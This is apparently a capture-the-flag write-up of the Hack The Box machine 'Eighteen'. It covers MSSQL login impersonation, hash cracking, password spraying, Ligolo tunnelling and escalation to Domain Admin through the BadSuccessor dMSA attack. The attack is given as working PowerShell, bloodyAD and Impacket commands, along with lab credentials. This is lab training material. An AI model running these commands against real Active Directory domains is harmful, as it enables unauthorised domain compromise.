---
title: 'HTB-Eighteen'
published: 2025-11-17
draft: false
toc: true
tags: ['BloodyAD', 'BadSuccessor', 'dMSA', 'mssql', 'Werkzeug', 'Ligolo', 'port-forwarding']
---

---
```
Scope:
10.10.11.95

Creds:
kevin
iNa2we6haRj2gaw!
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn eighteen.htb 

PORT     STATE SERVICE  REASON  VERSION
80/tcp   open  http     syn-ack Microsoft IIS httpd 10.0
|_http-title: Welcome - eighteen.htb
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s syn-ack Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-11-17T16:59:02+00:00; +6h59m59s from scanner time.
5985/tcp open  http     syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I tried the creds for `winrm` but they didn't work, let's try them for port `80` instead.

## 80/TCP - HTTP

![](attachments/3daa73d8915bf76e895d3f1f0b42d73c.png)

I tried the provided creds here but it didn't work here either.

![](attachments/0d1687328763ad6a519cbd6f6c3bde59.png)

## 1433/TCP - MSSQL

I then tried out the `mssql` service where the creds did seem to work:

![](attachments/88893c48854548ebb122a6102f0d9aa3.png)

I proceeded by logging in via `impacket-mssqlclient`:

![](attachments/a7255a87030ed9f03f5d0ed3afb652c3.png)

:::important
Contrary to the `nxc` command, `mssqlclient` only worked while omitting the `-windows-auth` tag.
:::

I wasn't able to enable the `xp_cmdshell` so it was time for some enumeration.

### enumeration

![](attachments/46e650e4679d0e34717d7844bf300760.png)

From this context I enumerated my current user further:

![](attachments/425cf5b09a9cab726d1ffbe4ad4e6cb2.png)

I then followed up with the following query which would enumerate all present users and which db's they could access:

```SQL
SELECT d.database_id, d.name AS database_name, dp.name AS db_user, dp.type_desc FROM sys.databases d CROSS APPLY ( SELECT name, type_desc FROM sys.database_principals ) dp WHERE d.database_id = DB_ID();
```

![](attachments/2ee3b6864d36288f3c815555c1820163.png)

This confirms that we're currently stuck inside the `master` db.

Next up I looked for interesting accounts:

```sql
SELECT principal_id, name, type, type_desc, is_disabled, create_date FROM sys.server_principals ORDER BY type_desc, name;
```

![](attachments/6e2f19f166acfcfb85bff5d75b182b66.png)

Using the following command we can then check whether we can impersonate someone:

```sql
SELECT pr.name AS principal_with_right, pe.permission_name, pe.state_desc FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id WHERE pe.permission_name LIKE '%IMPERSONATE%';
```

![](attachments/8ffaf2c4b5912d2e4eac52b5c8d4f22d.png)

This is good, let's check further:

```sql
SELECT pe.permission_name, pe.state_desc, pe.class_desc, pe.major_id AS target_principal_id, sp_target.name AS target_principal_name FROM sys.server_permissions pe LEFT JOIN sys.server_principals sp_target ON pe.major_id = sp_target.principal_id WHERE pe.permission_name = 'IMPERSONATE' AND pe.grantee_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name='kevin');
```

![](attachments/1e21530feb4939e487b380f6b7f150d6.png)

### impersonating appdev

It turns out we can impersonate the *appdev* user, let's try it out.

```sql
EXECUTE AS LOGIN = 'appdev';
SELECT ORIGINAL_LOGIN() AS original_login, SUSER_SNAME() AS current_login, USER_NAME() AS db_user;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

With the above commands I enumerated the permissions of the *appdev* user, turns out we can now check out other databases with them:

![](attachments/76ff501793cd23fa874678bb36e03517.png)

Let's check out the `financial_planner` database.

### financial_planner

![](attachments/8e909a9f42a4a99a530e7cf05f1ebc7c.png)

Since we don't see any non-default tables we'll assume everything's under `dbo`.

```sql
SELECT s.name AS schema_name, t.name AS table_name FROM sys.tables t JOIN sys.schemas s ON t.schema_id = s.schema_id ORDER BY schema_name, table_name;
```

![](attachments/fdc265410dceab8f18c521d9b4bd12cd.png)

We notice the `users` table, let's check it out:

```sql
SELECT * FROM dbo.users;
```

![](attachments/e5782ad0515287ac3b7a6ebe4ce2de26.png)

This is a `python werkzeug` hash which I tried to crack using `hashcat` but failed.

# Exploitation
## Hash cracking

Instead I used the following script to crack the password:

![](attachments/ecfd9f8e1310a2a1d82a806290164030.png)

```
admin
iloveyou1
```

Using these creds I was able to log into the admin dashboard on port `80`:

![](attachments/9e9189b25aa7ea0d8900737af79da281.png)

Down at the bottom I noticed the previous user had tried exploiting the `flask` templating language:

![](attachments/7e213e326d7472576ca20ad119eca929.png)

This led to a death end though, leading me to check elsewhere.

## Password Spraying

Instead I first used `nxc` to enumerate the users on the target:

![](attachments/e8abe8d85bedca905de181f9d22c7c74.png)

I then password sprayed the found password against the enumerated users.

![](attachments/73fb0c949caa9686a482e7790345fccc.png)

# Foothold
## 5985/TCP - WINRM

Using the following credentials I logged in:

```
adam.scott
iloveyou1
```

![](attachments/f06199cad4b5b749c0ff5a13c921fe6d.png)

### user.txt

![](attachments/a801eef737e11d00f875e593f1ffda1c.png)

## Enumeration

I transferred over `winpeas` and let it enumerate the target.

![](attachments/1cc758c55abcd1625a8ab1e279f0c6d2.png)

I found some named pipes:

![](attachments/07f04ca6c84a41b8270ec30401da6159.png)

However these could not be exploited:

![](attachments/6439b539d57a22c4ada9c2857f05e4a2.png)

This didn't show anything interesting though. One thing I did find though was the abundance of internally exposed AD ports:

![](attachments/987a0ddcfd9bbe39de3ef522c9dbf498.png)

One way to expose these would be through **Port Forwarding**.

## Tunneling

I then enumerated the target using `bloodhound` but this didn't show anything useful either.
Instead I had to port forward first using `ligolo` in order to expose the internal ports.

![](attachments/f17074f44d28ba352b9a03283b1b3b45.png)

![](attachments/0f58f0e14fd3551c810de38a7160def8.png)

I then set up the port forward:

![](attachments/9e18c97c67a85cf21e54059907d40cf5.png)

## bloodyAD

Once I had the port forward set up I tried some commands using `bloodyAD`:

![](attachments/7d7a6c0534d5b55201aea4756cb4f4b1.png)

:::note
It was now able to reach the AD server (unlike previously), all that's left is to get the correct command down.

![](attachments/d2f20022283f4cc0b1e8972bb3ed577c.png)
:::

I used [this cheatsheet](https://seriotonctf.github.io/BloodyAD-Cheatsheet/) to enumerate the target using various `bloodyAD` commands. One command showed me some interesting output:

![](attachments/2673f954db0aa7a31a0e9840d4840574.png)

This showed us that we have `WRITE` permissions, however we still couldn't do much with it at this point. From my `nxc` enumeration I remembered the system version of the target.

![](attachments/5db9b7d71b38898f1bb96be4a2f8907f.png)

While this version seems up to date, there have apparently been found flaws already that could help us in this case.

# Privilege Escalation
## BadSuccessor - Abusing dMSA

Looking around on google I found the following [blog post](https://forestall.io/blog/en/active-directory/privilege-escalation-by-abusing-dmsa-the-badsuccessor-vulnerability/) that matched my current situation:

![](attachments/fa8e762a29d2114ada7551cfc5592438.png)

A bit further down we see how it matches the current situation.

![](attachments/27f425af9c7b3b79eecc6c0091964e02.png)

### Exploitation

I then got to the exploitation part and used the following command to create a new computer:

```powershell
New-MachineAccount -MachineAccount ATTACKER -Password (ConvertTo-SecureString 'P@ssword123' -AsPlainText -Force) -DistinguishedName "CN=ATTACKER,OU=Staff,DC=eighteen,DC=htb"
```

![](attachments/ce22222cf3efc16cd2660ce3ea31d901.png)

As the blog mentions:

:::note
To achieve privilege escalation within the domain, it is necessary either to create a **dMSA** account or to have write permissions on the **msDS-ManagedAccountPrecededByLink** and **msDS-DelegatedMSAState** attributes of an existing **dMSA** account.
:::

Next up we'll use the following command:

```powershell
New-ADServiceAccount -Name "vulnDMSA" -DNSHostName "vulndmsa.eighteen.htb" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "CN=ATTACKER,OU=Staff,DC=eighteen,DC=htb" -Path "OU=Staff,DC=eighteen,DC=htb"
```

Then the following:

```powershell
# Identity you control
$identity = "eighteen\adam.scott"
 
# DN of the target DMSA object
$objectDN = "CN=vulnDMSA,OU=Staff,DC=eighteen,DC=htb"
 
# Get current ACL on the DMSA
$acl = Get-Acl "AD:$objectDN"
 
# Convert identity into an NTAccount object
$identityRef = New-Object System.Security.Principal.NTAccount($identity)
 
# Create a GenericAll ACE (full control on this ONE object)
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule `
(
    $identityRef,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
 
# Add ACE to object ACL
$acl.AddAccessRule($ace)
 
# Write back ACL
Set-Acl -Path "AD:$objectDN" -AclObject $acl
```

![](attachments/36ab1a6f08185924e2a866393356b7cc.png)

Once that is done the next commands:

```powershell
# Bind to the DMSA object
$dMSA = [ADSI]"LDAP://CN=vulnDMSA,OU=Staff,DC=eighteen,DC=htb"

# Mark migration as finished (required before modifying precededBy)
$dMSA.Put("msDS-DelegatedMSAState", 2)

# Set the precededBy link to the target object (Administrator in this example)
$dMSA.Put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,DC=eighteen,DC=htb")

# Commit the changes
$dMSA.SetInfo()
```

:::note
During the creation of the **dMSA** account, the attacker obtains the TGT ticket associated with the machine account they are using via the **PrincipalsAllowedToRetrieveManagedPassword** configuration, making this machine account the preferred choice since it has the necessary permissions to read the **dMSA** object’s password.
:::

```powershell
.\Rubeus.exe asktgt /user:ATTACKER$ /password:'P@ssword123' /enctype:aes256 /nowrap
```

However this ultimately did not work for some reason:

![](attachments/1cfc057815245b1279d87da5cea97cef.png)

### more bloodyAD

Instead I opted to use `bloodyAD` instead of doing it via `powershell`. In order to do this though I had to reference the [following github issue](https://github.com/CravateRouge/bloodyAD/issues/101) since it wouldn't work:

![](attachments/e912be7ee8744a676a4134c817e67fd7.png)

I looked up where my `bloodyAD` package was installed and modified the code:

![](attachments/b0f19c8a8156dc03f04ed788b3c16ea8.png)

![](attachments/63062856abed75730dd8204295107ac8.png)

![](attachments/504b4cdfd111b25bf381e6d200c5888b.png)

Once this was fixed it worked without an issue:

```bash
bloodyAD --dc-ip 240.0.0.1 -d eighteen.htb -u adam.scott -p iloveyou1 add badSuccessor hacker3
```

![](attachments/422adbea29e5ebc3185490a49555511c.png)

Now I was able to get the service ticket:

```bash
impacket-getST -dc-ip 240.0.0.1 -spn 'ldap/dc01.eighteen.htb' eighteen.htb/hacker3$ -k -no-pass
```

![](attachments/880b96245ef162a74318500a0979ec0e.png)

Once this was done it was free game:

```bash
impacket-psexec -k -no-pass 'eighteen.htb/hacker3$@dc01.eighteen.htb'
```

![](attachments/6bda4307af5b8a39a849cc373e61c7a6.png)

#### root.txt

![](attachments/539d9e21a29ed6b681b9d9b37e4ae303.png)

![](attachments/ba372a1e579db82bc1a6f8226d81c388.png)

---